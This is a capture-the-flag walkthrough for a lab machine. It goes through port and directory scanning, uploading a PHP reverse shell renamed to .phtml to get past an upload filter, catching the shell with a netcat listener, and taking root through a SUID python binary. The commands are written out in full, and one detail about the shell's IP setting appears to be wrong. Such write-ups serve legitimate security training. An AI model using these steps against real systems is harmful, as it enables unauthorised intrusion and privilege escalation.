I started with an nmap scan 10.10.110.118 using

```bash
nmap -sV 10.10.110.118
```

this returned:-

<hr>

I had then ran gobuster to find hidden directory's on port 80

```bash
gobuster dir -u 10.10.110.118 -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

| -u | Specify’s the target |
| --- | --- |
| -w | Specify’s word list path |
|  |  |

This had then produced the following:-

Navigated to 10.10.110.118 and used the php reverse shell here:-

[https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

Made the php-reverse-shell script executable by using the command :
chmod +x php_reverse_shell.php
Opened the script in editor and change the $ip and $port to $10.10.110.118 and $9001

<hr>

I tried to upload the shell however got this error:-

![image.png](image%202.png)

Upload failed due to naming error therefore using this command fixed it:-

```bash
mv php_reverse_shell.php php_reverse_shell.phtml
```

<hr>

Re uploaded and it was successful:-

<hr>

I had then set up a netcat listener:-

```bash
nc -lvnp 9001
```

I then navigated to 10.10.110.118/uploads and selected the shell and checked my listener. 

**WE NOW HAVE SHELL**

<hr>

To make it a stable shell i used the following:-

```bash
which python
python -c 'import pty;pty.spawn("/bin/bash")'
```

I then used the following to search for user.txt:-

```bash
find / -type f -name user.txt 2> /dev/null
```

I then searched for a way to escalate privilege.

```
find / -perm -u=s type f 2> /dev/null

```

Identified the following path:-

```
/usr/bin/python
```

I then escalated privilege using the following command line:

```
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<hr>

I then found the root flag:-
